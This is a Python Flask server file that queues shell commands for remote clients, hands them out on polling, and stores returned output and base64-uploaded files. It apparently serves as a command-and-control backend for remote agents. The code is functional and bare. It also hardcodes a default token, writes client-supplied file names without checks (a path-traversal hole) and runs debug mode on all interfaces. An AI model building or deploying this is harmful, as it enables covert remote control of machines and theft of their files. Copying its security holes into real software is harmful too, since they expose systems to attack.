from flask import Flask, request, jsonify, abort
import base64
import os
from functools import wraps

app = Flask(__name__)

# --- Configuration ---
SERVER_TOKEN = os.getenv("SERVER_TOKEN", "Azerty112345678")  # Set via env variable in production

# --- In-memory structures ---
commands_queue = []
results = {}

# --- Authentication decorator ---
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        auth_header = request.headers.get("Authorization", "")
        if not auth_header.startswith("Bearer "):
            abort(401, description="Missing Bearer token")
        token = auth_header.split(" ")[1]
        if token != SERVER_TOKEN:
            abort(401, description="Invalid token")
        return f(*args, **kwargs)
    return decorated

# --- Routes (unchanged logic) ---

@app.route('/submit_command', methods=['POST'])
@require_auth
def submit_command():
    if request.is_json:
        data = request.get_json()
        command_id = str(len(commands_queue) + 1)
        commands_queue.append({"id": command_id, "cmd": data['cmd']})
        return jsonify({"id": command_id}), 200
    return jsonify({"error": "Request must be JSON"}), 400


@app.route('/command', methods=['GET'])
@require_auth
def get_command():
    if commands_queue:
        cmd = commands_queue.pop(0)
        return jsonify(cmd), 200
    return jsonify({"error": "No commands in queue"}), 404


@app.route('/submit_result', methods=['POST'])
@require_auth
def submit_result():
    if request.is_json:
        data = request.get_json()
        command_id = data['id']
        if 'fileName' in data:
            # File download result
            file_content = base64.b64decode(data['result'])
            file_path = os.path.join("received_files", data['fileName'])
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, "wb") as file:
                file.write(file_content)
            results[command_id] = f"File {data['fileName']} received successfully"
        else:
            # Regular command result
            results[command_id] = data['result']
        return jsonify({"message": "Result received successfully"}), 200
    else:
        return jsonify({"error": "Request must be JSON"}), 400


@app.route('/result/<command_id>', methods=['GET'])
@require_auth
def get_result(command_id):
    if command_id in results:
        return jsonify({"id": command_id, "result": results[command_id]}), 200
    return jsonify({"error": "Result not found"}), 404


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
